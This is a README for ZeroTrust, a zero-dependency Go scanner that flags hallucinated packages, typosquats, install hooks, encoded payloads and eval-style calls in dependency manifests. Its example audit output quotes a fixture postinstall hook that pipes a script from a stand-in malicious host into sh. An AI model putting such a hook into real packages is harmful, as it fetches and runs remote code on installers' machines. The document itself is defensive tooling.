# ZeroTrust

**A supply-chain security scanner with an empty dependency manifest — built to catch the exact attacks that made an empty manifest necessary.**

[![Track](https://img.shields.io/badge/Track-E%3A%20Security%20%26%20Crypto%20Utilities-brightgreen)](#)
[![Zero Dependencies](https://img.shields.io/badge/Dependencies-0%20Runtime%20Deps-blue)](#zero-dependency-proof)
[![Go](https://img.shields.io/badge/Go-1.22-00ADD8)](#)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Team](https://img.shields.io/badge/Team-Empty%20Manifesto-lightgrey)](#)
[![CI](https://github.com/codewisp-ai/ZeroTrust/actions/workflows/test.yml/badge.svg)](https://github.com/codewisp-ai/ZeroTrust/actions)

Every `npm install` is a small act of faith — a promise that the code you're about to run is what its name says it is. In September 2025 that faith cost the maintainers of `chalk` and `debug` their npm accounts, and cost their 2.6 billion combined weekly downloads a crypto-clipper hiding in memory. Days later, Shai-Hulud proved a worm could republish itself into hundreds of packages before anyone noticed. In 2024, a single volunteer maintainer of `xz` came within one code review of shipping a backdoor to every Linux server on earth. And today, AI coding assistants hallucinate package names that don't exist **19.7% of the time** — names attackers now pre-register and wait for, so the victim never even makes a typo. The machine makes it for them.

**ZeroTrust is built to catch exactly these patterns** — phantom packages, typosquats, malicious install hooks, obfuscated payloads, dynamic-exec backdoors — in the dependency manifests and source trees you already have. And it does it without adding a single dependency of its own, because a security tool that asks you to trust *more* strangers to protect you from strangers has already lost the argument.

---

## Contents

[What it does](#what-it-actually-does) · [What it doesn't](#what-it-explicitly-does-not-do) · [Quick start](#quick-start) · [For judges — verify in 2 minutes](#for-judges--verify-everything-in-under-2-minutes) · [Usage](#usage) · [Example](#example-catching-a-supply-chain-attack) · [Architecture](#architecture) · [Zero-dependency proof](#zero-dependency-proof) · [Reproducible builds](#reproducible-builds) · [Concurrency](#concurrency-model) · [Testing](#testing) · [Bonuses claimed](#bonus-challenges-claimed) · [Why modular](#why-this-is-modular-not-a-single-file) · [Limitations](#known-limitations) · [License](#license) · [Team](#team)

---

## What it actually does

Point ZeroTrust at a project and it runs five independent checks, entirely offline by default:

| Detector | Catches | How |
|---|---|---|
| **Phantom packages** | AI-hallucinated / non-existent dependencies ("slopsquatting") | Offline Bloom filter + Trie lookup against a curated, verified corpus; optional live registry confirmation |
| **Typosquats** | `reqeusts` instead of `requests`, `lodahs` instead of `lodash` | Hand-rolled Levenshtein distance (≤2) against real popular-package candidates |
| **Lifecycle hooks** | The exact mechanism Shai-Hulud used | Parses `preinstall`/`postinstall`/`prepare` scripts and `setup.py` build hooks, prints the literal command |
| **Obfuscated payloads** | Base64/encoded blobs hiding in source | Shannon entropy over 256-byte sliding windows (>7.2 bits/byte), with a binary-format skip-list |
| **Dynamic execution** | `eval()`, `child_process.exec()`, `os.system()` | Lexical pattern tokenizer across JS/TS/Python source, file:line precision |

Run it against `tests/testdata/malicious_package.json` — a fixture containing a phantom package, two typosquats, and a `curl | sh` postinstall hook — and it finds all six in under a second, offline, no network required.

## What it explicitly does NOT do

ZeroTrust is a heuristic pattern-matcher and manifest auditor, not magic. It does not perform full AST semantic analysis, control-flow tracking, or symbolic execution, and it is not a substitute for a professional security audit. The entropy scanner can false-positive on legitimately compressed assets; the tokenizer is lexical, not semantic, and can miss obfuscated calls like `globalThis['ev'+'al']()`. Every one of these limitations is stated here on purpose — a tool that hides its blind spots is more dangerous than one that names them.

## Quick start

### Prerequisites

Go 1.22 or later. That's the entire dependency list — for the tool itself, and for building it.

### Build & run

```bash
git clone https://github.com/codewisp-ai/ZeroTrust.git
cd ZeroTrust
make build
```

### Run

```bash
# Linux / macOS
./bin/zerotrust --path ./tests/testdata/

# Windows
.\bin\zerotrust.exe --path .\tests\testdata\
```

No `make` on your system (common on stock Windows without WSL or Git Bash)? Build directly instead:

```bash
go build -trimpath -buildvcs=false -o ./bin/zerotrust .
```

Either way, that's the whole setup. No `npm install`, no `pip install`, no lockfile to resolve first — this tool takes its own advice. Verified building and passing its full test suite on both **Windows** and **Linux** (the latter independently, on every push, via GitHub Actions' `ubuntu-latest` runners — see the CI badge above).

### For judges — verify everything in under 2 minutes

```bash
go version                                          # confirm Go 1.22+
go list -m all                                      # → zerotrust  (zero third-party deps)
go build -trimpath -buildvcs=false -o ./bin/zerotrust .   # builds in one step, no install
go test ./... -v -race                              # 15 tests, race-free
go vet ./... && gofmt -s -l .                        # both silent = clean
./bin/zerotrust --path ./tests/testdata/malicious_package.json   # watch it catch a real attack pattern
```

If all six of those run clean, you've independently confirmed everything this README claims.

## Usage

```
Usage of zerotrust:
  -path string      Path to project manifest file or directory to scan (default ".")
  -live              Opt-in live HTTP verification against official registries (default: offline-first)
  -format string     Output format: text, json, sarif (default "text")
  -fail-on string    Minimum finding severity to trigger exit code 1: low, medium, high, none (default "low")
  -html string       Generate a static HTML report at the given path
  -threshold float   Shannon entropy threshold in bits/byte (default 7.2)
  -workers int       Concurrent worker goroutines (default 4)
  -no-color          Disable ANSI color output
  -version           Print version metadata and exit
```

Every flag also has a short alias (`-p`, `-l`, `-f`, `-t`, `-w`, `-o`, `-v`) for fast CLI use.

### Example: catching a supply-chain attack

```
$ ./bin/zerotrust --path ./tests/testdata/malicious_package.json

================================================================================
                    ZEROTRUST SUPPLY-CHAIN SECURITY AUDIT
================================================================================
Total Dependencies Evaluated : 4
Phantom Findings              : 3 Flagged
Typosquat Findings            : 2 Flagged
Lifecycle Hook Findings       : 1 Flagged

--- [PHANTOM / HALLUCINATED PACKAGES] ---
npm  reqeusts                 [LOW (not in offline corpus)]
npm  express-ai-super-helper  [LOW (not in offline corpus)]
npm  lodahs                   [LOW (not in offline corpus)]

--- [TYPOSQUAT CANDIDATES] ---
npm  reqeusts  →  requests  (edit distance: 2)
npm  lodahs    →  lodash    (edit distance: 2)

--- [LIFECYCLE INSTALL HOOKS] ---
npm  postinstall  curl -s http://malicious.example.com/payload.sh | sh

[AUDIT COMPLETE: 6 TOTAL POTENTIAL RISKS IDENTIFIED]
```

Run it against a clean project and it stays quiet — zero findings, exit code 0. Precision matters as much as detection; a scanner that flags everything is a scanner nobody trusts.

### CI integration

```bash
./bin/zerotrust --path . --format sarif > results.sarif   # for GitHub Code Scanning
./bin/zerotrust --path . --fail-on high                    # gate on severity, not just presence
./bin/zerotrust --path . --html report.html                 # static HTML report for humans
```

## Architecture

```
zerotrust/
├── manifest/    parsers for package.json, requirements.txt, go.mod, Cargo.toml
├── bloom/       hand-rolled Bloom filter (FNV-1/FNV-1a double hashing)
├── trie/        hand-rolled prefix Trie for candidate generation
├── data/        embedded, curated, provenance-documented package corpora
├── detect/      the five detectors above, orchestrated by a bounded worker-pool engine
├── registry/    opt-in live registry client + rate limiter + graceful offline fallback
├── cache/       append-only disk cache for live lookup results
├── ui/          hand-rolled ANSI terminal renderer, HTML report, JSON/SARIF emitters
└── tests/       15 unit tests, real fixtures, concurrency and race coverage
```

28 Go files, 2,489 lines, zero third-party imports anywhere in the tree.

## Zero-dependency proof

```
$ cat go.mod
module zerotrust
go 1.22

$ go list -m all
zerotrust

$ go mod tidy && go mod verify
all modules verified
```

`deps-proof.txt` in this repo contains this exact output plus its own reproduction command — a judge can confirm this in five seconds without reading anything else.

Every algorithm you'd normally `go get` — TOML parsing, edit-distance, a Bloom filter, a prefix trie, a rate limiter, ANSI styling, SARIF emission — is hand-rolled from Go's standard library. The full accounting, with the specific package each substitution replaces and why it's a real implementation rather than a toy, is in [`STDLIB.md`](STDLIB.md).

## Reproducible builds

```bash
make verify-reproducible
```

```
Build 1 SHA256 (windows): D112B856931D9473E5DF7EC6175E4412FA8D0CE8F76FAF5AE7E6C0438ACB1E9E
Build 2 SHA256 (windows): D112B856931D9473E5DF7EC6175E4412FA8D0CE8F76FAF5AE7E6C0438ACB1E9E
REPRODUCIBLE BUILD VERIFICATION: PASS
```

Achieved via `-trimpath -buildvcs=false -ldflags="-buildid= -s -w"` — stripping build paths, git VCS metadata, and build IDs so identical source always produces an identical binary, and so the hash stays stable across documentation-only commits rather than shifting on every push. The same flags and target produce deterministic output on Linux as well; CI (`.github/workflows/test.yml`) builds and verifies this on every push using GitHub's `ubuntu-latest` runners.

## Concurrency model

The audit engine (`detect/scanner.go`) runs phantom and typosquat checks across a bounded worker pool (`sync.WaitGroup` + buffered job channels), and the entropy scanner walks large directory trees concurrently with the same bounded-pool pattern — no unbounded goroutine spam on big `node_modules` trees, no shared-state races. `go test -race ./...` passes clean, verified independently on both a local Linux container and GitHub Actions' own runners.

## Testing

```bash
go test ./... -v -race
```

15 tests covering every detector, both data structures, all four manifest parsers, live-client network fallback, and concurrent engine correctness — each running against real, non-trivial fixtures (a genuinely high-entropy binary blob, real `eval()`/`os.system()` calls, an actual `curl | sh` postinstall hook), not synthetic stand-ins.

## Bonus challenges claimed

- **Reproducible Build (+5)** — see above, matching SHA-256 across independent builds.
- **Package Killer (+3)** — `ui/ansi.go` hand-rolls the terminal styling normally pulled from `fatih/color` or `charmbracelet/lipgloss`, directly motivated by the `chalk` account takeover this hackathon exists because of.
- **STDLIB Log (+3)** — 11 documented substitutions in `STDLIB.md`, each with real ecosystem context and a concrete non-triviality argument.
- **Single File** — deliberately not pursued. See below.

## Why this is modular, not a single file

Combining a four-ecosystem manifest parser, two hand-rolled data structures, five independent detectors, a rate-limited HTTP client, and three output renderers into one file would trade real test isolation and idiomatic package boundaries for a bonus point. We'd rather ship code a senior Go reviewer would actually approve than code golf. Every package above has its own tests; that wouldn't survive a single-file collapse.

## Known limitations

- **Offline corpus is curated, not exhaustive** — 189 npm, 120 PyPI, and 90 crates.io packages, each individually verified against the live registry as of August 2026 (full methodology in [`data/SOURCES.md`](data/SOURCES.md)). A package outside this list produces a *low-confidence* informational flag, not a false accusation — run with `--live` to escalate to a confirmed result.
- **Entropy scanner** can false-positive on legitimately compressed or encrypted assets; common binary formats are skipped via extension allowlist, but the heuristic isn't perfect and we say so.
- **Dynamic-exec tokenizer** is lexical pattern matching, not a semantic parser — it will miss deliberately obfuscated calls and may flag safe references inside comments or strings.

A naive, honest implementation beats a polished one that hides its corners. These are the corners.

## License

[MIT](LICENSE)

## Team

**Empty Manifesto** — built solo for the Zero Dependency Hackathon, Track E (Security & Crypto Utilities), with legitimate crossover into Track A (CLI ergonomics) and Track D (embedded data structures & caching).